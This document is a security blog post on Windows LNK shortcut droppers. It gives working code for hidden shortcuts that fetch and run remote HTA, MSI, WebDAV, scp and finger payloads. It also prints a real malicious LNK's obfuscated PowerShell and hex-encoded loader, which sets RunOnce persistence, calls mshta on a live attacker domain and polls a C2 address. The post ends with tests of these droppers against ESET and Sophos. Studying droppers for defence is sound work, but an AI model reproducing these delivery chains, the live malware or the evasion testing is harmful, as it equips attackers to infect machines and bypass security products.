---
layout: post
title: LNK - Will you be my dropper? 
date: 2023-08-22 09:56:00-0400
description: Analysis of the most used vectors for distribution
tags: malware misc
categories: malware
giscus_comments: false
related_posts: false
featured: false
thumbnail: assets/img/lnk/cover.png
toc:
  beginning: true
---
In this article we will see some types of droppers, in particular LNKs, with various methodologies, from basic to the most advanced.

# Overview

These files are one of the most used malware distribution vectors by attackers today.
The payloads are chained with the execution of other applications, until a chain is created and the actual malware is downloaded


## Create Basic LNK via Powershell

To create a link via powershell we will use the <b>CreateShortcut</b> method.
You can see more info <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-client/admin-development/create-desktop-shortcut-with-wsh" target="_blank">Here</a>

```powershell

$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\test.lnk")
$ShortCut.Arguments = "-c cmd.exe"
$ShortCut.WindowStyle = 7 #This will Hidden the Window
$ShortCut.TargetPath = "powershell"
$ShortCut.IconLocation = "C:\Windows\System32\notepad.exe, 0";
$ShortCut.Description = "Type: Microsoft";
$ShortCut.Save()

```

Once the file is created and executed, the cmd will be prompted

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/1.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>

     <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/2.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>
<div class="caption">
    Create LNK and exec
</div>
 
 

## Some of possible ways

Starting from this file, let's analyze some ways we can use to load our malware.
For the moment we will focus on the payloads, without loading any malicious programs, but only an alert.


### HTA

Hello.hta
```javascript
<html> 
<head> 
	<script language="JScript">
	var shell = new ActiveXObject("WScript.Shell");
	var res = shell.Popup("Hello",0,"I will load the malware",0);
	
	</script>
</head> 
<body>
	<script language="JScript">self.close();</script>
</body> 
</html>

```

Taking the powershell code to create a link as a reference, we only change this line

```powershell
#Before
#$ShortCut.Arguments = "-c cmd.exe"

#After
$ShortCut.Arguments = "-c mshta('http://192.168.240.140:8000/test.hta')"

```
This line will download our HTA file remotely and run it.
This will be the result.

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include video.html path="assets/video/lnk/poc-1.mp4" class="img-fluid rounded z-depth-1" controls=true zoomable=true %}
    </div>
</div>
<div class="caption">
    HTA Execution
</div>


The execution flow of THIS dropper can be briefly described as follows

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/g1.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>

</div>
<div class="caption">
    HTA flow.
</div>


### 4shared.com - Thank you for your service.

Another service used for building payloads is the <a>4shared.com</a> site
This sharing and file hosting site allows us, through their service, to setup a WebFolder in Microsoft.
The documentation tells us all the steps to follow.

<ul>
    <li>Click 'Start' and then choose 'My Computer';</li>
    <li>Choose 'Tools' Option (the top of the window);</li>
    <li>Click 'Map Network Drive' from the list;</li>
    <li>Click 'Sign up for online storage or connect to a network server' at the bottom of the window;</li>
    <li>Click 'Next';</li>
    <li>Select 'Choose another network location' then click 'Next >' again;</li>
    <li>In the address field type https://webdav.4shared.com/</li>
    <li>Enter your 4shared account login and password;</li>
    <li>Click 'Next';</li>
    <li>Click 'Finish'</li>
 
</ul>


Click 'Start' and then choose 'My Computer';
Choose 'Tools' Option (the top of the window);
Click 'Map Network Drive' from the list;
Click 'Sign up for online storage or connect to a network server' at the bottom of the window;
Click 'Next';
Select 'Choose another network location' then click 'Next >' again;
In the address field type https://webdav.4shared.com/
Enter your 4shared account login and password;
Click 'Next';
Click 'Finish'
payload

Once a file has been uploaded to our space, we can insert this payload:

```bash

cmd.exe /c "net use E: https://webdav.4shared.com MY_SECRET_PASSWORD /user:xekit58371@ipnuc.com" && 
type E:\HelloWorld.exe > tmp.exe && 
forfiles /p C:\Windows\System32\ /m notepad.exe /c %cd%/tmp.exe  && net use * /d /y"

```

The payload maps the remote folder as drive E:\, copies the Hello.exe file to tmp.exe and runs it, then disconnects all drives.
Let's just run it in cmd:

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/6.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/7.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>


Perfect, now build the LNK.

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include video.html path="assets/video/lnk/poc-webdav.mp4" class="img-fluid rounded z-depth-1" controls=true zoomable=true %}
    </div>
</div>
<div class="caption">
    Webdav Payload Download
</div>



### .URL

The .URL extension is another type of file used for payload distribution, it is nothing more than an "Internet Shortcut", so we can put it directly to an .exe file, or to other files which will in turn start the chain for installing malware.

The usual use is to create a share on a server that is accessible from the outside (in this case I will do it locally), where the connection can fetch the file directly, let's see how:


```bash
file://192.168.240.140/testing/Hello.exe

```

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/8.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
    <div class="col-sm mt-3 mt-md-0">
         {% include video.html path="assets/video/lnk/poc-url.mp4" class="img-fluid rounded z-depth-1" controls=true zoomable=true %}
    </div>
</div>
<div class="caption">
    Basic .URL in action
</div>


### Using SCP

Another widely used payload is to copy files from a server with the scp command which is already integrated into Windows.

```bash

/c "scp -o StrictHostKeyChecking=no user@ssh:/The/File %APPDATA%\Loader.hta" & %APPDATA%\Loader.hta

```

### Using Remote Installers (msiexec.exe)

Windows binaries are very often used, both for evasion and convenience issues. in this case we can also launch an msi remotely

```bash

C:\Windows\System32\msiexec.exe /i "http://example.com/Installer.msi"

```
we can also use /quiet  /qn flags, for a background installation.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/9.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>
<div class="caption">
    Putty example
</div>

### Finger


Using finger we can modify our server's response to take our payload and execute it
A (stupid) example:

```bash
finger 192.168.240.140 | ForEach-Object {  $line= $_.toString(); iex($line)

finger 192.168.240.140  | Select-Object -Skip 3 -Last 1 | iex

```

A basic paylaod like that return 2/60 on <a href="https://www.virustotal.com/gui/file/f1c22d185169bb41146a5daeedac0faf2fa2ad5b8a17f073c8f008c573ff97b4/detection" target="_blank">Virustotal</a>
But like now we will not cover Evasion we will just analyze some files.



### File binding, let's analyze the matryoshka - (Spreaded File Example)

Another method to obfuscate payloads is to hide files and payloads within the same file.
To understand better, let's take a real example of a malicious LNK.

Let's start with a malicious file,inside this file were inserted:

<ul>
    <li>1 xlsx file</li>
    <li>1 payload that execute the malware.</li>
 
</ul>


#### Analyze the main code

We start the analysis by visualizing the first payload, the one we can see in the lnk file.


icon_file_name: 
D:\C2 Framwork\InkMaker v1\HncApp\HCell.exe

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/4.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>

</div>
<div class="caption">
    File Size.
</div>

```powershell
C:\Windows\SysWOW64\cmd.exe /c powershell -windowstyle hidden $pEbjEn = Get-Location;if($pEbjEn -Match 'System32' -or $pEbjEn -Match 'Program Files') {$pEbjEn = '%temp%'};$lyHWPSj = Get-ChildItem -Path $pEbjEn -Recurse *.lnk ^| where-object {$_.length -eq 0x18C0000} ^| Select-Object -ExpandProperty FullName;if($lyHWPSj.GetType() -Match 'Object'){$lyHWPSj = $lyHWPSj[0];};$lyHWPSj;$C5ytw = gc $lyHWPSj -Encoding Byte -TotalCount 74240 -ReadCount 74240;$tyxkEP = '%temp%\현황조사표.xlsx';sc $tyxkEP ([byte[]]($C5ytw ^| select -Skip 62464)) -Encoding Byte; ^& $tyxkEP;$Cbe1yj = gc $lyHWPSj -Encoding Byte -TotalCount 79888 -ReadCount 79888;$WH9lSPHOFI = '%temp%\PMmVvG56FLC9y.bat';sc $WH9lSPHOFI ([byte[]]($Cbe1yj ^| select -Skip 74342)) -Encoding Byte;^& %windir%\SysWOW64\cmd.exe /c $WH9lSPHOFI;

```


After deobfuscation the code looks like this, let's analyze step by step:

```powershell

#Step1 - Get Path location, if location in Program Files or System32, path will be %temp%
$path = Get-Location;
if($path -Match 'System32' -or $path -Match 'Program Files') {$path = '%temp%'};

#Step 2 - Get all files, and select file file with LNK extension where the leghnt is equal to = 0x18C0000 = 25952256 =  24.7 MB, So he is looking for himself.
$findLink = Get-ChildItem -Path $path -Recurse *.lnk | where-object {$_.length -eq 0x18C0000} | Select-Object -ExpandProperty FullName;
if($findLink.GetType() -Match 'Object'){$findLink = $findLink[0];};

$findLink;

#Step3 - Get Content (type 	cat 	Get-Content 	gc, cat, type) -  Read 74240 from the beginning of LNK file
#         Create xls file, and copy 74240 - 11776 bytes to the file. then open it.
$TotalBytes = gc $findLink -Encoding Byte -TotalCount 74240 -ReadCount 74240;
$tmpXLS = 'test.xlsx';
sc $tmpXLS ([byte[]]($TotalBytes | select -Skip 62464)) -Encoding Byte; 

#& $tyxkEP;


#Step4 Do the same thing just changing byte number, and copy all to a .bat file.
$BatPayload = gc $findLink -Encoding Byte -TotalCount 79888 -ReadCount 79888;

$runBat = 'executor.bat';

sc $runBat ([byte[]]($BatPayload | select -Skip 74342)) -Encoding Byte; 

#Execute The BAT FILE.
#& %windir%\SysWOW64\cmd.exe /c $runBat;


```


At this point in the folder we will have these files:

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/3.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>

</div>
<div class="caption">
    File Created by first script.
</div>


The excel content appears to be this:

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/5.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>

</div>
<div class="caption">
    Excel content
</div>



#### Check the generated files

But what we are interested in now is the content of the bat file, which at first glance, obfuscated once again, is the following:


```bat
copy %~f0 "%appdata%\Microsoft\Protect\UserProfileSafeBackup.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v BackupUserProfiles /t REG_SZ /f /d "C:\Windows\SysWOW64\cmd.exe /c %appdata%\Microsoft\Protect\UserProfileSafeBackup.bat"

start /min C:\Windows\SysWOW64\cmd.exe /c powershell -windowstyle hidden -command "$m6drsidu ="$jWHmcU="""53746172742D536C656570202D5365636F6E64732036373B0D0A246E76536B6C55626151203D2031303234202A20313032343B0D0A247969786773465679203D2024656E763A434F4D50555445524E414D45202B20272D27202B2024656E763A555345524E414D452B272D5348273B0D0A24615777203D2027687474703A2F2F37352E3131392E3133362E3230372F636F6E6669672F62617365732F636F6E6669672E70687027202B20273F553D27202B202479697867734656793B0D0A24624C6D6F69667148774A786845203D2024656E763A54454D50202B20272F4B734B273B0D0A696620282128546573742D506174682024624C6D6F69667148774A7868452929207B0D0A204E65772D4974656D50726F7065727479202D506174682022484B43553A5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E4F6E636522202D4E616D65204F6C6D202D56616C75652027633A5C77696E646F77735C73797374656D33325C636D642E657865202F6320506F7765725368656C6C2E657865202D57696E646F775374796C652068696464656E202D4E6F4C6F676F202D4E6F6E496E746572616374697665202D6570206279706173732070696E67202D6E2031202D772033313137313420322E322E322E32207C7C206D7368746120687474703A2F2F6269616E303135312E6361666532342E636F6D2F61646D696E2F626F6172642F312E68746D6C27202D50726F70657274795479706520537472696E67202D466F7263653B0D0A7D0D0A0D0A66756E6374696F6E207576415828245A547864482C202443725A79667375615042597A290D0A7B0D0A20202020246E464B467258484B465651726F4B203D205B53797374656D2E546578742E456E636F64696E675D3A3A555446382E4765744279746573282443725A79667375615042597A293B0D0A202020205B53797374656D2E4E65742E48747470576562526571756573745D2024526E7A67717143203D205B53797374656D2E4E65742E576562526571756573745D3A3A43726561746528245A54786448293B0D0A2020202024526E7A677171432E4D6574686F64203D2027504F5354273B0D0A2020202024526E7A677171432E436F6E74656E7454797065203D20276170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F646564273B0D0A2020202024526E7A677171432E436F6E74656E744C656E677468203D20246E464B467258484B465651726F4B2E4C656E6774683B0D0A2020202024624C6D6F69667148774A78684555203D2024526E7A677171432E4765745265717565737453747265616D28293B0D0A2020202024624C6D6F69667148774A786845552E577269746528246E464B467258484B465651726F4B2C20302C20246E464B467258484B465651726F4B2E4C656E677468293B0D0A2020202024624C6D6F69667148774A786845552E466C75736828293B0D0A2020202024624C6D6F69667148774A786845552E436C6F736528293B0D0A202020205B53797374656D2E4E65742E48747470576562526573706F6E73655D20245845577742203D2024526E7A677171432E476574526573706F6E736528293B0D0A2020202024464F4F46467A6777564948203D204E65772D4F626A6563742053797374656D2E494F2E53747265616D526561646572282458455777422E476574526573706F6E736553747265616D2829293B0D0A2020202024624C6D6F69667148774A786845554C54203D2024464F4F46467A67775649482E52656164546F456E6428293B0D0A2020202072657475726E2024624C6D6F69667148774A786845554C543B0D0A7D0D0A646F0D0A7B0D0A202020205472797B0D0A2020202020202020246F7A69517575203D207576415820246157772027273B0D0A202020202020202049662028246F7A69517575202D6E6520276E756C6C27202D616E6420246F7A69517575202D6E65202727290D0A20202020202020207B0D0A202020202020202020202020246F7A695175753D246F7A695175752E537562537472696E6728312C20246F7A695175752E4C656E677468202D2032293B0D0A202020202020202020202020246250435A7562724A466F63203D205B53797374656D2E546578742E456E636F64696E675D3A3A555446382E476574537472696E67285B53797374656D2E436F6E766572745D3A3A46726F6D426173653634537472696E6728246F7A6951757529293B0D0A20202020202020202020202069662028246250435A7562724A466F63290D0A2020202020202020202020207B0D0A2020202020202020202020202020202069662028246250435A7562724A466F632E436F6E7461696E732827726567656469743A2729290D0A202020202020202020202020202020207B0D0A2020202020202020202020202020202020202020246D6274447643656E74784B3D246250435A7562724A466F632E537562537472696E672838293B0D0A202020202020202020202020202020202020202024436861724172726179203D246D6274447643656E74784B2E53706C697428277C7C27293B0D0A202020202020202020202020202020202020202069662028244368617241727261792E4C656E677468202D65712035290D0A20202020202020202020202020202020202020207B0D0A2020202020202020202020202020202020202020202020204E65772D4974656D50726F7065727479202D5061746820244368617241727261795B305D202D4E616D6520244368617241727261795B325D202D56616C756520244368617241727261795B345D202D50726F70657274795479706520537472696E67202D466F7263653B0D0A202020202020202020202020202020202020202020202020244372724B684E464F4E46474B203D2027523D27202B205B53797374656D2E436F6E766572745D3A3A546F426173653634537472696E67285B53797374656D2E546578742E456E636F64696E675D3A3A555446382E47657442797465732827454F462729293B0D0A20202020202020202020202020202020202020202020202075764158202461577720244372724B684E464F4E46474B3B0D0A20202020202020202020202020202020202020207D0D0A202020202020202020202020202020207D0D0A202020202020202020202020202020202020202020202020207D0D0A20202020202020207D0D0A202020207D2043617463687B7D0D0A7D7768696C65282474727565202D6571202474727565290D0A2020202053746172742D536C656570202D5365636F6E647320353B""";$nj4KKFFRe="""""";for($xlEKy9tdBWJ=0;$xlEKy9tdBWJ -le $jWHmcU.Length-2;$xlEKy9tdBWJ=$xlEKy9tdBWJ+2){$dYaD=$jWHmcU[$xlEKy9tdBWJ]+$jWHmcU[$xlEKy9tdBWJ+1];$nj4KKFFRe= $nj4KKFFRe+[char]([convert]::toint16($dYaD,16));};Invoke-Command -ScriptBlock ([Scriptblock]::Create($nj4KKFFRe));";Invoke-Command -ScriptBlock ([Scriptblock]::Create($m6drsidu));"

```


The first 3 lines of the code make sure to create persistence in the system, let's see how

```bat
Note: %~f0 take the name and path of the current .bat file, so in this case, C:\Path\location\executor.bat

#Step1 - Copy the bat file in "%appdata%\Microsoft\Protect\" with the name of UserProfileSafeBackup.bat
copy %~f0 "%appdata%\Microsoft\Protect\UserProfileSafeBackup.bat"

#Step2 - Create persistence in the RunOnce key.
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v BackupUserProfiles /t REG_SZ /f /d "C:\Windows\SysWOW64\cmd.exe /c %appdata%\Microsoft\Protect\UserProfileSafeBackup.bat"

```


The other part of the script is more interesting, it creates a variable with functions inside, and creates a script block
```powershell
[Scriptblock]::Create
```

By deobfuscating the internal variable "nj4KKFFRe" we will have this code:



```powershell
Start-Sleep -Seconds 67;

$nvSklUbaQ = 1024 * 1024;

$hostname = $env:COMPUTERNAME + '-' + $env:USERNAME+'-SH';
$baseUrl = 'http://75.119.136.207/config/bases/config.php' + '?U=' + $hostname;

$tmpPath = $env:TEMP + '/KsK';  #C:\Users\user\AppData\Local\Temp\KsK

#If path not exist Set another regex, and Exec another HTA payload
if (!(Test-Path $tmpPath)) {
 New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" -Name Olm -Value 'c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 311714 2.2.2.2 || mshta http://bian0151.cafe24.com/admin
/board/1.html' -PropertyType String -Force;
}


#Post Request(URL,DATA) return response
function DoPostRequest($url, $input)
{
    $post_data = [System.Text.Encoding]::UTF8.GetBytes($input);
    [System.Net.HttpWebRequest] $HttpRequest = [System.Net.WebRequest]::Create($url);
    $HttpRequest.Method = 'POST';
    $HttpRequest.ContentType = 'application/x-www-form-urlencoded';
    $HttpRequest.ContentLength = $post_data.Length;
    
    $Stream  = $HttpRequest.GetRequestStream();
    $Stream.Write($post_data, 0, $post_data.Length);
    $Stream.Flush();
    $Stream.Close();
    [System.Net.HttpWebResponse] $Response = $HttpRequest.GetResponse();
    
    $RespoonseReader = New-Object System.IO.StreamReader($Response.GetResponseStream());

    $Resutl = $ResponseReader.ReadToEnd();
    return $Result;
}


#Main, do Each 5 second
do
{
    Try{
    #Do the request
        $ResultRequest = DoPostRequest $baseUrl '';
        #If request IS NOT null
        If ($ResultRequest -ne 'null' -and $ResultRequest -ne '')
        {
            #Parse someresult
            $ResultRequest=$ResultRequest.SubString(1, $ResultRequest.Length - 2);

            $DecodedRes = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ResultRequest));

            #If decoded Res contains regedit
            if ($DecodedRes)
            {
                if ($DecodedRes.Contains('regedit:'))
                {
                    #Get Substring of 8 and split in char array
                    $tmpString = $DecodedRes.SubString(8);
                    $CharArray =$tmpString.Split('||');

                    #If the char array is 5
                    if ($CharArray.Length -eq 5)
                    {
                        #Create a new property, maybe a registry key
                        New-ItemProperty -Path $CharArray[0] -Name $CharArray[2] -Value $CharArray[4] -PropertyType String -Force;
                        $newdata = 'R=' + [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('EOF')); # R=RU9G
                        DoPostRequest $baseUrl $newdata; #Do another Post and continue the Loop
                    }
                }
                         }
        }
    } Catch{}
}while($true -eq $true)
    Start-Sleep -Seconds 5;

```

Essentially, this code, as soon as it is launched, checks that the %tmp%/KsK path is present, if not, it adds more persistence on the RunOnce key, downloading another hta from the site

<a href="#">http://bian0151.cafe24.com/admin/board/1.html</a>

Since the URL is offline, we cannot know what that file contained, but this is a very practical example of how payload delivery chains are made.

Then the program sends a POST request to the URL every 5 seconds
<a>http://75.119.136.207/config/bases/config.php?U=myhostname</a>


if the response is not empty, it is decoded in base 64 and if the string "regedit:" is present in the response string, the string is divided and split into a final char array, and if the array is equal to 5, a system key is added, each parameter is a field of the array
Subsequently, a post request is sent to the usual url, with the post data R=RU9G.

This whole thing is done to create persistence and add system keys, probably the C2 agent was released from that HTA file.
This example perfectly represents how a delivery chain can be intrinsic.



## Evasion

Now it's time to test something, we will test some of our payloads against Eset, Kaspersky, and Sophos. (For the moment this is what I have).


### Let's prepare the soup

For this test we will use a loader that will load the Havoc C2 framework. (At the time of testing, the loader was FUD).
I will try 2 payload, an msi, and the 4share.com one.
Finally, I will send the payload in a zip by email, having it downloaded from google drive.

We will target ESET Premium and Sophos EDR.


### Testing time
As a first attempt, I create my own msi file, i will call setup.msi.
Then as the first LNK i will try the basic msi remote installer, the result follow:


<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include video.html path="assets/video/lnk/poc-eset.mp4" class="img-fluid rounded z-depth-1" controls=true zoomable=true %}
    </div>
</div>
<div class="caption">
    Eset MSI test Eset Premium
</div>


<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include video.html path="assets/video/lnk/poc-sophos-2.mp4" class="img-fluid rounded z-depth-1" controls=true zoomable=true %}
    </div>
</div>
<div class="caption">
    Sophos MSI Sophos EDR
</div>



<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include video.html path="assets/video/lnk/poc-sophos-1.mp4" class="img-fluid rounded z-depth-1" controls=true zoomable=true %}
    </div>
</div>
<div class="caption">
    Sophos 4shared.com payload Sophos EDR
</div>

In the first payload I request UAC in the second I don't.
Note that these payloads were not very elaborate, it was all done in a short time for the purpose of testing the AVs.


# Conclusion

In this little post we have analyzed some of the most common payloads for LNK extensions, and analyzed a known file used by some attackers.
We did some small tests against two antiviruses, simulating sending an email and executing a file.
As we have seen, there are many ways in which we can create our chain before installing the malware.

See you in the next post.

<div class="row mt-3">
    
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.html path="assets/img/lnk/cover.png" class="img-fluid rounded z-depth-1" zoomable=false %}
    </div>

    
</div>
